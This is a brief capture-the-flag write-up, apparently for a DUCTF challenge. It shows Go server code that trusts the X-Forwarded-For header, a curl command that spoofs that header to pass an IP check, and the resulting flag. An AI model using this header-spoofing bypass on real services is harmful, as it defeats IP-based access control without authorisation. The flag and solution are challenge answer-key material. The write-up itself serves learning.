From the `main()` function you can see that the server looks for the `X-Forwarded-for` header, and if it exists, uses that IP instead of the actual source IP from the http request:

```go
        xff := r.Header.Values("X-Forwarded-For")  
        ip := strings.Split(r.RemoteAddr, ":")[0]
        if xff != nil {
            ips := strings.Split(xff[len(xff)-1], ", ")
            ip = ips[len(ips)-1]
            ip = strings.TrimSpace(ip)
        }
```

Clearly the flag would be obtainable if the server recognises a specific IP, such as when specified in that header:
```go
        if ip != "31.33.33.7" {
            message := fmt.Sprintf("untrusted IP: %s", ip)
            http.Error(w, message, http.StatusForbidden)
            return
        } else {
            w.Write([]byte(os.Getenv("FLAG")))
        }
```
To get the flag, simply create a curl request to the given target URI:
`curl -H "X-Forwarded-For: 31.33.33.7" http://proxed.duc.tf:30019`

Flag: `DUCTF{17_533m5_w3_f0rg07_70_pr0x}`